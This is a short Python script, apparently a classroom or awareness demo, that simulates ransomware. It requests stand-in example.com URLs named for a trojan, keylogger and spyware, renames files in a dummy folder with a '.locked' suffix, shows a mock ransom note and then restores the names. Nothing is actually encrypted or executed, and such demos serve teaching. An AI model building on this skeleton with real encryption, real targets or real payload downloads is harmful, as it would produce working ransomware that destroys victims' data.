import os
import requests
import tkinter as tk
from tkinter import messagebox

def download_fake_modules():
    FAKE_MODULES_URLS = [
        "https://example.com/fake_trojan_horse",
        "https://example.com/fake_keylogger",
        "https://example.com/fake_spyware",
    ]
    
    print("Starting to download fake modules...\n")
    for url in FAKE_MODULES_URLS:
        try:
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                print(f"Successfully downloaded module from {url}!")
            else:
                print(f"Failed to download module from {url}.")
        except requests.RequestException:
            print(f"Error while trying to download from {url}.")

def fake_encrypt():
    TARGET_DIR = './dummy_data'
    FAKE_EXTENSION = '.locked'

    for root, _, files in os.walk(TARGET_DIR):
        for file in files:
            src = os.path.join(root, file)
            dst = src + FAKE_EXTENSION
            os.rename(src, dst)

def fake_decrypt():
    TARGET_DIR = './dummy_data'
    FAKE_EXTENSION = '.locked'

    for root, _, files in os.walk(TARGET_DIR):
        for file in files:
            if file.endswith(FAKE_EXTENSION):
                src = os.path.join(root, file)
                dst = src.replace(FAKE_EXTENSION, '')
                os.rename(src, dst)

def display_ransom_note():
    root = tk.Tk()
    root.withdraw()  # Hide the main window
    messagebox.showinfo(
        "RANSOMWARE SIMULATION",
        "Your files have been 'encrypted'! To 'decrypt' them, click OK. "
        "Remember, always be cautious with files from unknown sources!"
    )
    root.destroy()

def run_simulation():
    download_fake_modules()
    fake_encrypt()
    display_ransom_note()
    fake_decrypt()
    print("Simulation complete!")

# To run the simulation, just call:
# run_simulation()
